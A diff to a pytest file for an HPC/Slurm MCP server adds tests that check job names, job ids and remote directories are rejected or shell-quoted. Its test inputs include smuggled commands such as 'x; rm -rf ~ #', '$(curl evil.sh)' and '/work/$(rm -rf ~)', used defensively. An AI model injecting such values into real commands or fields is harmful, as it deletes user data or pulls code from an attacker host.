@@ -162,10 +162,64 @@ def test_fetch_explicit_remote_dir_override(monkeypatch, tmp_path: Path):
         return P()
 
     monkeypatch.setattr(srv.subprocess, "run", fake_run)
-    r = srv.fetch("unknown-id", str(tmp_path / "out"),
+    r = srv.fetch("777", str(tmp_path / "out"),
                   remote_dir="/scratch/custom")
     assert r["ok"]
-    assert "alice@hpc.example.edu:/scratch/custom/" in captured["cmd"]
+    assert "alice@hpc.example.edu:/scratch/custom/" in " ".join(captured["cmd"])
+
+
+# ── 远端 shell 注入加固（推翻"无任意 shell 执行"承诺的安全洞） ──────────────
+
+
+def test_submit_rejects_injection_jobname(monkeypatch, tmp_path: Path):
+    monkeypatch.setenv("CHEMASTER_HOME", str(tmp_path))
+    _write_cfg(tmp_path)
+    from chemaster.mcp.hpc_slurm import server as srv
+    r = srv.submit(command="echo hi", jobname="x; rm -rf ~ #")
+    assert not r["ok"] and r["error_code"] == "INVALID_JOBNAME"
+
+
+def test_status_rejects_injection_job_id(monkeypatch, tmp_path: Path):
+    monkeypatch.setenv("CHEMASTER_HOME", str(tmp_path))
+    _write_cfg(tmp_path)
+    from chemaster.mcp.hpc_slurm import server as srv
+    r = srv.status("$(curl evil.sh)")
+    assert not r["ok"] and r["error_code"] == "INVALID_JOB_ID"
+
+
+def test_fetch_quotes_remote_dir(monkeypatch, tmp_path: Path):
+    """remote_dir 里的 shell 元字符必须被 quote，不能拼裸命令。"""
+    monkeypatch.setenv("CHEMASTER_HOME", str(tmp_path))
+    _write_cfg(tmp_path)
+    from chemaster.mcp.hpc_slurm import server as srv
+
+    captured: dict = {}
+
+    def fake_run(cmd, **kw):
+        captured["cmd"] = cmd
+
+        class P:
+            returncode = 0
+            stdout = ""
+            stderr = ""
+        return P()
+
+    monkeypatch.setattr(srv.subprocess, "run", fake_run)
+    srv.fetch("777", str(tmp_path / "out"), remote_dir="/work/$(rm -rf ~)")
+    joined = " ".join(captured["cmd"])
+    # $(...) 必须被 quote 包住，不能作为裸命令替换出现
+    assert "'/work/$(rm -rf ~)/'" in joined
+
+
+def test_record_job_atomic_write_survives_concurrent(monkeypatch, tmp_path: Path):
+    """原子写：并发登记后索引不丢、不截断。"""
+    monkeypatch.setenv("CHEMASTER_HOME", str(tmp_path))
+    from chemaster.mcp.hpc_slurm import server as srv
+    for i in range(20):
+        srv._record_job(str(i), {"remote_workdir": f"/w/{i}",
+                                 "host": "h", "user": "u"})
+    idx = srv._load_jobs_index()
+    assert len(idx) == 20 and idx["19"]["remote_workdir"] == "/w/19"
 
 
 def test_hpc_tools_registered():
